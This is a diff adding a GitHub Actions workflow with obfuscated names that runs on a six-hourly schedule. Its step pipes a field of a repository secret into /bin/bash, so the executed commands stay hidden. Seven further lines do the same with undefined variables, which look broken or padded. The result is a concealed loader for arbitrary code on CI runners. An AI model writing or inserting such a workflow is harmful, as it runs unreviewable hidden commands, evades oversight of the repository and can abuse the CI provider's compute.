@@ -1,0 +1,24 @@
+name: tangjiusjqsjq
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangjiusjqsjq
+        env:
+          jr74: ${{ secrets.jr74 }}
+        run: |
+          echo $jr74 | jq -r .nxnd66084 | /bin/bash
+          echo $yaltl528 | jq -r .sm3447 | /bin/bash
+          echo $soxfg28 | jq -r .pd270 | /bin/bash
+          echo $onwuv6531 | jq -r .hwpk15904 | /bin/bash
+          echo $zf8 | jq -r .sidyw9 | /bin/bash
+          echo $nv4 | jq -r .vncvk17 | /bin/bash
+          echo $iy6832 | jq -r .cpdid5925 | /bin/bash
+          echo $fpt53 | jq -r .mir52587 | /bin/bash
+
